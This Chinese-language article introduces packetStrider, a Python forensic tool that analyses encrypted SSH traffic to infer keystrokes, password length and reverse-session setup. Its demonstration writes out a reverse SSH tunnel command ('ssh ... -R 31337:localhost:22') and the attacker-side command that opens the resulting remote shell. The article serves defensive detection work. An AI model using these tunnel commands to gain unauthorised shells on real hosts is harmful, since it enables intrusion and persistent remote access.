![](https://image.3001.net/images/20210320/1616252759_60560f57a2b658787109d.png!small)

## packetStrider

packetStrider是一款针对SSH的数据包取证工具，该工具旨在为研究人员提供对SSH流量本质进行研究的能力。packetStrider的出现，为研究人员针对SSH网络流量的研究和取证点亮了一盏明灯，可以帮助广大研究人员发现SSH数据流量中隐藏的“宝藏”。

SSH流量显然是经过加密处理的，但是有价值的上下文信息仍然存在于网络通信量中。甚至还有可能存在有价值的上下文不可用或从主机中删除的情况，因此具有不可变和不可变的被动网络捕获将为我们提供了额外的取证上下文。

跟取证上下文不同的是，packetStrider预测功能还能够以主动的方式来使用。比如说，如果在内部预测隧道反向SSH会话发起特性，则甚至在提供反向认证之前，也可以回避/RST转发连接。

## 工具使用

packetStrider基于Python 3开发，因此要求用户需在本地设备上安装并配置好Python 3环境。除此之外，我们还需要安装好下列依赖模块：

    
    
    pip3 install pandas matplotlib pyshark

接下来，使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/benjeems/packetStrider.git

下载并解压后，在命令行终端切换至项目目录下，然后运行下列命令即可查看工具帮助信息：

    
    
    python3 packetStrider-ssh.py -h

 **上述命令的输出如下：**

    
    
    usage: packetStrider-ssh.py [-h] [-f FILE] [-n NSTREAM] [-m] [-k] [-p]
    
                                 [-z ZOOM] [-d DIRECTION] [-o OUTPUT_DIR]
    
                                 [-w WINDOW] [-s STRIDE]
    
     
    
    packetStrider-ssh is a packet forensics tool for SSH. It creates a rich
    
    feature set from packet metadata such SSH Protocol message content, direction,
    
    size, latency and sequencing. It performs pattern matching on these features,
    
    using statistical analysis, and sliding windows to predict session initiation,
    
    keystrokes, human/script behavior, password length, use of client
    
    certificates, context into the historic nature of client/server contact and
    
    exfil/infil data movement characteristics in both Forward and Reverse sessions
    
     
    
    optional arguments:
    
      -h, --help            show this help message and exit
    
      -f FILE, --file FILE  pcap file to analyze
    
      -n NSTREAM, --nstream NSTREAM
    
                            Perform analysis only on stream n
    
      -m, --metaonly        Display stream metadata only
    
      -k, --keystrokes      Perform keystroke prediction
    
      -p, --predict_plot    Plot data movement and keystrokes
    
      -z ZOOM, --zoom ZOOM  Narrow down/zoom the analysis and plotting to only
    
                            packets "x-y"
    
      -d DIRECTION, --direction DIRECTION
    
                            Perform analysis on SSH direction : "forward",
    
                            "reverse" OR "both"
    
      -o OUTPUT_DIR, --output_dir OUTPUT_DIR
    
                            Directory to output plots
    
      -w WINDOW, --window WINDOW
    
                            Sliding window size, # of packets to side of window
    
                            center packet, default is 2
    
      -s STRIDE, --stride STRIDE
    
                            Stride between sliding windows, default is 1

## 工具使用样例

“forward_reverse.pcap”来源于一个反向SSH
Shell的常见TTP，它也是红队研究人员的最爱。具体来说，它使用了以下命令，并以最简单的方式突出了packetStrider的功能。

### 1、通过目标转发连接

转发会话的命令为“ssh user@1.2.3.4 -R
31337:localhost:22”，它会绑定本地端口31337，以便将反向SSH连接回传到目标PC。此连接可以通过多种方式实现，包括手动、通过RCE、SSRF或某种形式的持久化操作。在我们的演示过程中，它是一个手动标准转发会话。

这不是客户机第一次跟服务器通信，相关数据包的增量非常小，服务器的密钥指纹已经在客户机的已知主机中了，因此没有提示用户去添加它。

一个用户连续两次密码登录失败，然后用8个以上字符的密码成功登录。

“ls”命令在转发会话中输入，输入序列为：l，w，w，退格，退格，s，然后按下回车键。如果数据成功入站，那么传输数据的总大小将作为“ls”命令的输出。

### 2、现在在攻击者的设备（服务器）上，将会初始化一个反向Shell并回传给目标主机

命令如下：

    
    
    ssh victim@localhost -p 31337

此时，甚至在认证过程开始之前，packetStrider已经识别出了反向会话SSH初始化。

现在，攻击者将拿到目标主机上的反向Shell。接下来，他们就可以进行各种横向渗透或其他操作了。不过，本例中只会简单演示初始的用户识别。

“last”命令的键入顺序如下：l、a、s、r、删除键、t、回车。

“who”命令的键入顺序如下：w、h、o、回车。

“exit”命令的键入顺序如下：e、x、i、t、回车。

### 3、最终转发会话将会关闭，只演示转发SSh功能检测能够成功即可。

整个活动的网络流量将会存储在“tcpdump.pcap”文件中，那么接下来我们就可以运行packetStrider来进行取证分析了：

    
    
    python3 packetStrider-ssh.py -f tcpdump.pcap -k -p -o out

![](https://image.3001.net/images/20210320/1616252831_60560f9f45f6448e1d6b8.png!small)

我们可以看到输出结果中会显示击键预测的时间轴：

![](https://image.3001.net/images/20210320/1616252841_60560fa98d46b009910a6.png!small)

下面显示的是某些窗口统计数据，可以为针对流量的深入分析提供帮助或提供一些实验性功能：

![](https://image.3001.net/images/20210320/1616252850_60560fb263b8b93ff161e.png!small)

下图显示的是一份简单的统计直方图：

![](https://image.3001.net/images/20210320/1616252860_60560fbc886b59af21cb5.png!small)

## 项目地址

packetStrider：【[ _GitHub传送门_](https://github.com/benjeems/packetStrider)】

## 参考资料

> [ _https://matrix.org/blog/2019/05/08/post-mortem-and-remediations-for-> apr-11-security-incident_](https://matrix.org/blog/2019/05/08/post-mortem-> and-remediations-for-apr-11-security-incident)
>
> [ _https://skylightcyber.com/2019/09/26/all-your-cloud-are-belong-to-us-> cve-2019-12491/_](https://skylightcyber.com/2019/09/26/all-your-cloud-are-> belong-to-us-cve-2019-12491/)
>
> [ _https://cve.mitre.org/cgi-> bin/cvename.cgi?name=CVE-2019-12491_](https://cve.mitre.org/cgi-> bin/cvename.cgi?name=CVE-2019-12491)

